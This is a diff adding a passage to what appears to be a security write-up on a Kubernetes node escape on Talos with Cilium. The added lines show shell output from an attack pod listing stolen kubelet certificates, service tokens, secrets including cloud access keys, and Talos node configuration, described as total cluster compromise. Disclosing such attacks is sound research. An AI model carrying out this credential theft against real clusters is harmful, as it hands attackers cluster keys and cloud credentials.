@@ -171,7 +171,28 @@ with Cilium but has a Python runtime to drive the exploit.
    `/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~empty-dir/exfil-sandbox`
    — our attack pod's emptyDir volume, located by scanning pod directories
    for the volume name. Back in the attack pod, the results appear at
-   `/sandbox/`.
+   `/sandbox/`:
+
+   ```
+   bash-5.3# ls /sandbox
+   cmd              cmd.done         cmd.out          kubelet-certs
+   mount_state.log  secrets          talos-state      tokens
+
+   bash-5.3# ls /sandbox/talos-state/
+   config.yaml            encryption-salt.yaml
+   node-identity.yaml     platform-network.yaml
+
+   bash-5.3# ls /sandbox/secrets/
+   53680b44-...  693738c5-...  7c7584c7-...
+   af3e7b5d-...  d022029f-...  e28b5847-...
+
+   bash-5.3# ls /sandbox/secrets/53680b44-.../cloud-credentials/
+   AccessKeyId      SecretAccessKey   UserName
+   CreateDate       Status            default
+   ```
+
+   Talos `config.yaml` contains the cluster CA private key, etcd CA key, and
+   SA signing key — that's total cluster compromise.
 
 ## The CNI Wrapper Binary
 
